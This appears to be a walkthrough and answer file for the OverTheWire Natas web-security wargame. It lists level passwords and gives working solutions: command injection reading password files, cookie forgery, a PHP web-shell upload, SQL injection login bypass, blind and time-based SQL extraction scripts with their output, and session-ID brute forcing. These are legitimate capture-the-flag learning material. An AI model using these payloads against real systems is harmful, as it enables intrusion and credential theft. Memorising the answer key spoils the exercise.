# Documentation

Passwords to enter each level:
The username is `natas` + the level.

- 0: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
- 1: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
- 2: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
- 3: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
- 4: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
- 5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
- 6: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
- 7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
- 8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
- 9: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
- 10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
- 11: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
- 12: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
- 13: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
- 14: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
- 15: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
- 16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
- 17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
- 18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
- 19: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
- 20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

## Level 9-10

```sh
-L 'aaaaaaa' $(find /etc -type f)

'.*' /etc/natas_webpass/natas11
```

## Level 10-11

```py
import base64

# The original data and the cookie you received
plain = '{"showpassword":"no", "bgcolor":"#ffffff"}'
cookie_b64 = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJVSJnTRg="

# 1. Decode the cookie back to raw bytes
cookie_raw = base64.b64decode(cookie_b64)

# 2. Derive the key (XOR plain with the cookie)
# We use a bytearray to store the result
key_full = bytes([a ^ b for a, b in zip(plain.encode(), cookie_raw)])

# Let's grab the first 4 chars if you've identified that's the length
key = key_full[:4] 
print(f"Detected Key: {key.decode()}")

# 3. Construct the attack payload
target_plain = '{"showpassword":"yes", "bgcolor":"#ffffff"}'
target_bytes = target_plain.encode()

# 4. XOR the target with the repeating key
# Use a modulo operator (%) to loop the key over the longer string
attack_raw = bytes([target_bytes[i] ^ key[i % len(key)] for i in range(len(target_bytes))])

# 5. Encode to Base64
attack_final = base64.b64encode(attack_raw).decode()
print(f"Attack Cookie: {attack_final}")
```

## Level 11-12

Request body for: `POST /index.php`

```txt
filename: 1gux72iu5c.php
uploadedfile: <?php passthru("cat /etc/natas_webpass/natas13"); ?>
MAX_FILE_SIZE: 1000
```

Then open the link that is returned in the response, eg: <http://natas12.natas.labs.overthewire.org/upload/f7mlgd9d4k.php>.

## Level 12-13

Request body for: `POST /index.php`

`ffd8ffe0` are bytes that must be at the beginning of `uploadfile`.
These bytes mark the file as a jpeg.

```txt
filename: 1gux72iu5c.php
uploadedfile: ffd8ffe0<?php passthru("cat /etc/natas_webpass/natas14"); ?>
MAX_FILE_SIZE: 1000
```

Then open the link that is returned in the response, eg: <http://natas13.natas.labs.overthewire.org/upload/f7mlgd9d4k.php>.

## Level 13-14

Request body for: `POST /index.php`

```txt
username=" or 1=1-- -
password=anything
```

## Level 14-15

```python
import string
import requests

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

# Create a clean list of characters (a-z, A-Z, 0-9)
items = string.ascii_letters + string.digits

password = ""

# Natas15 passwords are 32 chars long
for i in range(32):
    for char in items:
        # Construct the guess: password starts with [current_found] + [new_char]
        test_pass = password + char
        # The SQL injection: looking for users where username is natas16
        # AND the password starts with our current guess
        payload = f'natas16" AND password LIKE BINARY "{test_pass}%" -- '

        response = requests.post(url, auth=auth, data={"username": payload})

        if "This user exists." in response.text:
            password += char
            print(f"Progress: {password}")
            break  # Found the char, move to the next position

```

Output:

```txt
Progress: h
Progress: hP
Progress: hPk
Progress: hPkj
Progress: hPkjK
Progress: hPkjKY
Progress: hPkjKYv
Progress: hPkjKYvi
Progress: hPkjKYviL
Progress: hPkjKYviLQ
Progress: hPkjKYviLQc
Progress: hPkjKYviLQct
Progress: hPkjKYviLQctE
Progress: hPkjKYviLQctEW
Progress: hPkjKYviLQctEW3
Progress: hPkjKYviLQctEW33
Progress: hPkjKYviLQctEW33Q
Progress: hPkjKYviLQctEW33Qm
Progress: hPkjKYviLQctEW33Qmu
Progress: hPkjKYviLQctEW33QmuX
Progress: hPkjKYviLQctEW33QmuXL
Progress: hPkjKYviLQctEW33QmuXL6
Progress: hPkjKYviLQctEW33QmuXL6e
Progress: hPkjKYviLQctEW33QmuXL6eD
Progress: hPkjKYviLQctEW33QmuXL6eDV
Progress: hPkjKYviLQctEW33QmuXL6eDVf
Progress: hPkjKYviLQctEW33QmuXL6eDVfM
Progress: hPkjKYviLQctEW33QmuXL6eDVfMW
Progress: hPkjKYviLQctEW33QmuXL6eDVfMW4
Progress: hPkjKYviLQctEW33QmuXL6eDVfMW4s
Progress: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
Progress: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

## Level 15-16

```py
import requests

target = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered_chars = ""

# 1. First, find which characters exist in the flag to save time
for c in chars:
    r = requests.get(
        target + f"?needle=Africans$(grep {c} /etc/natas_webpass/natas17)", auth=auth
    )
    if "Africans" not in r.text:
        filtered_chars += c
        print(f"Found char: {c}")

# 2. Brute force the position
flag = ""
for i in range(32):
    for c in filtered_chars:
        # Check if the flag starts with the current string + c
        payload = f"Africans$(grep ^{flag}{c} /etc/natas_webpass/natas17)"
        r = requests.get(target + f"?needle={payload}", auth=auth)

        if "Africans" not in r.text:
            flag += c
            print(f"Flag so far: {flag}")
            break
```

## Level 16-17

```py
import string
import requests

url = "http://natas17.natas.labs.overthewire.org/index.php"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

# Sort characters by ASCII value for binary search
chars = sorted(string.ascii_letters + string.digits)
password = ""

print("Starting Binary Search extraction...")

for i in range(1, 33):
    low = 0
    high = len(chars) - 1
    found_char = ""

    while low <= high:
        mid = (low + high) // 2
        char_to_test = chars[mid]
        
        # We use ASCII() to compare numeric values: is the char > the middle of our current range?
        payload = f'natas18" AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username = "natas18"), {i}, 1)) > {ord(char_to_test)}, SLEEP(2), 1)-- '
        
        try:
            response = requests.post(url, auth=auth, data={"username": payload}, timeout=10)
            
            # If the response is slow, the character is GREATER than our mid point
            if response.elapsed.seconds >= 2:
                low = mid + 1
            else:
                # If it's fast, the character is EQUAL to or LESS than our mid point
                found_char = char_to_test
                high = mid - 1
        except requests.exceptions.Timeout:
            # Handle cases where SLEEP actually causes a socket timeout
            low = mid + 1

    # After the loop, 'low' will point to the correct character
    password += chars[low]
    print(f"[+] Character {i} found: {chars[low]} | Current Pass: {password}")

print(f"\nFinal Password: {password}")
```

Output:

```txt
Starting Binary Search extraction...
[+] Character 1 found: 6 | Current Pass: 6
[+] Character 2 found: O | Current Pass: 6O
[+] Character 3 found: G | Current Pass: 6OG
[+] Character 4 found: 1 | Current Pass: 6OG1
[+] Character 5 found: P | Current Pass: 6OG1P
[+] Character 6 found: b | Current Pass: 6OG1Pb
[+] Character 7 found: K | Current Pass: 6OG1PbK
[+] Character 8 found: d | Current Pass: 6OG1PbKd
[+] Character 9 found: V | Current Pass: 6OG1PbKdV
[+] Character 10 found: j | Current Pass: 6OG1PbKdVj
[+] Character 11 found: y | Current Pass: 6OG1PbKdVjy
[+] Character 12 found: B | Current Pass: 6OG1PbKdVjyB
[+] Character 13 found: l | Current Pass: 6OG1PbKdVjyBl
[+] Character 14 found: p | Current Pass: 6OG1PbKdVjyBlp
[+] Character 15 found: x | Current Pass: 6OG1PbKdVjyBlpx
[+] Character 16 found: g | Current Pass: 6OG1PbKdVjyBlpxg
[+] Character 17 found: D | Current Pass: 6OG1PbKdVjyBlpxgD
[+] Character 18 found: 4 | Current Pass: 6OG1PbKdVjyBlpxgD4
[+] Character 19 found: D | Current Pass: 6OG1PbKdVjyBlpxgD4D
[+] Character 20 found: D | Current Pass: 6OG1PbKdVjyBlpxgD4DD
[+] Character 21 found: b | Current Pass: 6OG1PbKdVjyBlpxgD4DDb
[+] Character 22 found: R | Current Pass: 6OG1PbKdVjyBlpxgD4DDbR
[+] Character 23 found: G | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG
[+] Character 24 found: 6 | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6
[+] Character 25 found: Z | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6Z
[+] Character 26 found: L | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZL
[+] Character 27 found: l | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZLl
[+] Character 28 found: C | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlC
[+] Character 29 found: G | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG
[+] Character 30 found: g | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg
[+] Character 31 found: C | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC
[+] Character 32 found: J | Current Pass: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

Final Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

## Level 17-18

Burp Suite Intruder with payload: numbers from range 1-640

```txt
POST /index.php HTTP/1.1
Host: natas18.natas.labs.overthewire.org
Content-Length: 27
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Origin: http://natas18.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas18.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=§§
Connection: keep-alive

username=admin&password=test
```

In one of the responses is the password for the next level.

## Level 18-19

```py
import requests

# Level configuration
URL = "http://natas19.natas.labs.overthewire.org/index.php"
AUTH = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
MAX_ID = 640

def solve():
    print(f"[*] Starting brute force of {MAX_ID} possible admin IDs...")

    for i in range(1, MAX_ID + 1):
        session_str = f"{i}-admin"
        session_hex = session_str.encode().hex()
        cookies = {'PHPSESSID': session_hex}
        
        try:
            response = requests.get(URL, auth=AUTH, cookies=cookies)
            
            # Check if we found the password
            if "You are an admin" in response.text:
                print(f"\n[+] Success! Valid Session ID found: {session_hex} (ID: {i})")
                
                # Extract the password
                content = response.text.split("Password: ")[1].split("</pre>")[0]
                print(f"[+] Password for natas20: {content}")
                return
            
            # Progress indicator
            if i % 50 == 0:
                print(f"[*] Tried {i} IDs...")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            break

    print("[-] Failed to find a valid admin session.")

if __name__ == "__main__":
    solve()
```
